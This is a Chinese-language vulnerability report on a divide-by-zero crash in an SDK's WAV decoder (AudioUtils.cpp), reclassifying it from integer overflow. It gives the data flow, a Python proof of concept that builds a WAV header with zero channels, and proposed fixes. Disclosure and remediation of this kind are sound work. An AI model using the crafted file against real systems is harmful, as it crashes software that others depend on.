# VULN-SEC-UTILS-002: WAV 文件 numChannels 字段未验证致除零崩溃

## 执行摘要

**状态**: 已确认（真实漏洞）  
**修正后的 CWE**: CWE-369（除零错误）  
**原始 CWE**: CWE-190（整数溢出） - **分类错误**  
**严重程度**: 中等  
**可利用性**: 中等（需要构造具有特定所有权/权限的 WAV 文件）

---

## 漏洞详情

### 原始分类（不正确）

原始报告将此漏洞分类为 CWE-190（整数溢出），位置在 AudioUtils.cpp:494， sinks 在 memcpy_s@185。经过详细分析，此分类**不正确**。

### 修正后的分类

**CWE-369: 除零错误（Divide By Zero）**

实际漏洞是 AudioUtils.cpp:495 处的除零错误，由 WAV 文件头中缺少对 `numChannels` 字段的验证引起。

---

## 技术分析

### 脆弱代码位置

**文件**: `/home/pwn20tty/Desktop/opencode_project/shenteng/MindSeriesSDK/MultimodalSDK/AccSDK/source/utils/AudioUtils.cpp`

**函数**: `AudioDecode`（第 465-505 行）

**脆弱代码块**（第 493-498 行）:
```cpp
std::vector<uint8_t> rawData(fileData.begin() + offset, fileData.begin() + offset + dataSize);
const uint32_t bytesPerSample = fmt.bitsPerSample / 8;            // 第 494 行
const uint32_t numSamples = dataSize / (bytesPerSample * fmt.numChannels);  // 第 495 行 - 脆弱点
std::vector<float> samples(numSamples * fmt.numChannels);
ret = ConvertAudioDataToFloat(rawData, fmt, numSamples * fmt.numChannels, samples);
```

### 根本原因

1. **缺少输入验证**: `CheckAudioFormat` 函数（第 331-344 行）验证了:
   - `audioFormat`（必须是 PCM 或 IEEE_FLOAT）
   - `bitsPerSample`（必须是 16、24 或 32）
   
   **但未验证 `numChannels`**，该值直接从 WAV fmt 块头部读取（第 274 行）。

2. **除零触发**: 在第 495 行:
   ```cpp
   const uint32_t numSamples = dataSize / (bytesPerSample * fmt.numChannels);
   ```
   
   如果 `fmt.numChannels == 0`，则 `bytesPerSample * fmt.numChannels == 0`，导致除零错误。

### 数据流分析

```
来源：用户提供的 WAV 文件
     ↓
ReadFile（FileUtils.cpp:105）→ 读取文件到 vector
     ↓
FindAndReadFmtChunk（AudioUtils.cpp:248）→ 读取 fmt 块到 WavFmt 结构体
     ↓
     fmt.numChannels = [来自 WAV 头部的值，未经验证]
     ↓
CheckAudioFormat（AudioUtils.cpp:331）→ 仅验证 audioFormat 和 bitsPerSample
     ↓
AudioDecode（AudioUtils.cpp:495）→ 如果 numChannels == 0 则除零
```

### 攻击向量

1. **构造恶意 WAV 文件**: 创建有效的 WAV 文件结构，包含:
   - 有效的 RIFF 头部
   - 有效的 fmt 块，其中 `numChannels = 0`
   - 有效的 data 块
   
2. **触发条件**:
   - 文件必须通过路径验证
   - 文件必须具有正确的所有者（与进程所有者相同）
   - 文件权限不得超过 0640
   - 文件必须具有.wav 扩展名
   - 文件大小不得超过 50MB

3. **影响**: 除零导致未定义行为，通常:
   - 程序崩溃（SIGFPE）
   - `numSamples` 的垃圾值
   - 如果垃圾值用于向量分配，可能导致内存破坏

---

## 为什么 CWE-190（整数溢出）分类不正确

### 乘法溢出可能性分析

在第 497 行:
```cpp
std::vector<float> samples(numSamples * fmt.numChannels);
```

对于溢出，需要：`numSamples * fmt.numChannels >= 2^32`

计算:
- 最大 `dataSize` = 50MB = 52,428,800 字节（受 AUDIO_MAX_FILE_SIZE 限制）
- 最小 `bytesPerSample` = 2（对于 16 位音频）
- 最大 `numSamples` = `dataSize / 2` = 26,214,400

对于最大 `numChannels` = 65535 的溢出:
```
numSamples = dataSize / (bytesPerSample * numChannels)
           = 52,428,800 / (2 * 65535)
           = 52,428,800 / 131,070
           ≈ 400
           
numSamples * numChannels = 400 * 65535 = 26,214,000
```

这**远低于** 2^32（约 43 亿）。不可能溢出。

### 数学证明

对于溢出：`dataSize / bytesPerSample >= 2^32`
- 对于 16 位音频需要 `dataSize >= 8,589,934,592` 字节（8GB）
- 这超出了 50MB 的文件大小限制

**结论**: 50MB 文件大小限制防止了此代码路径中的整数溢出。

---

## 现有缓解措施（部分）

1. **文件大小限制**: `AUDIO_MAX_FILE_SIZE = 50MB` 防止整数溢出
2. **文件所有者检查**: 文件必须由进程所有者拥有（IsFileValid）
3. **权限检查**: 权限不得超过 0640
4. **扩展名检查**: 仅接受.wav 文件

**缺陷**: 这些缓解措施均未验证 WAV 头部中的 `numChannels`。

---

## 概念验证（概念性）

```python
# 创建恶意 WAV 文件，numChannels = 0
import struct

def create_malicious_wav():
    riff_header = b'RIFF'
    file_size = struct.pack('<I', 44)  # 总文件大小 - 8
    wave_marker = b'WAVE'
    
    fmt_chunk_id = b'fmt '
    fmt_chunk_size = struct.pack('<I', 16)
    audio_format = struct.pack('<H', 1)  # PCM
    num_channels = struct.pack('<H', 0)  # 漏洞触发点
    sample_rate = struct.pack('<I', 44100)
    byte_rate = struct.pack('<I', 88200)
    block_align = struct.pack('<H', 2)
    bits_per_sample = struct.pack('<H', 16)
    
    data_chunk_id = b'data'
    data_chunk_size = struct.pack('<I', 8)
    audio_data = b'\x00\x00\x00\x00\x00\x00\x00\x00'
    
    wav_file = riff_header + file_size + wave_marker + \
               fmt_chunk_id + fmt_chunk_size + audio_format + num_channels + \
               sample_rate + byte_rate + block_align + bits_per_sample + \
               data_chunk_id + data_chunk_size + audio_data
    
    return wav_file
```

---

## 推荐修复方案

### 主要修复：验证 numChannels

在 `CheckAudioFormat` 函数中（AudioUtils.cpp:331-344），添加验证：

```cpp
ErrorCode CheckAudioFormat(const WavFmt& fmt)
{
    // 添加此检查
    if (fmt.numChannels == 0 || fmt.numChannels > 65535) {
        LogError << "Invalid channel count." << GetErrorInfo(ERR_INVALID_PARAM);
        return ERR_INVALID_PARAM;
    }
    
    // 考虑为实用音频添加上限
    constexpr uint16_t MAX_CHANNELS = 16;  // 大多数应用的合理最大值
    if (fmt.numChannels > MAX_CHANNELS) {
        LogError << "Channel count exceeds practical limit: " << fmt.numChannels
                 << GetErrorInfo(ERR_INVALID_PARAM);
        return ERR_INVALID_PARAM;
    }
    
    // ... 现有的 audioFormat 和 bitsPerSample 检查 ...
}
```

### 次要修复：AudioDecode 中的防御性编码

在第 495 行，添加防御性检查：

```cpp
if (fmt.numChannels == 0 || bytesPerSample == 0) {
    LogError << "Invalid audio parameters." << GetErrorInfo(ERR_INVALID_PARAM);
    return ERR_INVALID_PARAM;
}
const uint32_t numSamples = dataSize / (bytesPerSample * fmt.numChannels);
```

---

## 参考资料

- [CWE-369: Divide By Zero](https://cwe.mitre.org/data/definitions/369.html)
- [WAV File Format Specification](https://www-mmsp.ece.mcgill.ca/Documents/AudioFormats/WAVE/WAVE.html)

---

## 元数据

| 字段 | 值 |
|-------|-------|
| Vulnerability ID | VULN-SEC-UTILS-002 |
| Original CWE | CWE-190 (Integer Overflow) |
| Corrected CWE | CWE-369 (Divide By Zero) |
| File Path | AccSDK/source/utils/AudioUtils.cpp |
| Line Number | 495 (corrected from 495) |
| Function | AudioDecode |
| Trust Level | untrusted_local |
| Attack Vector | Malformed WAV file with numChannels=0 |

(文件结束 - 共 238 行)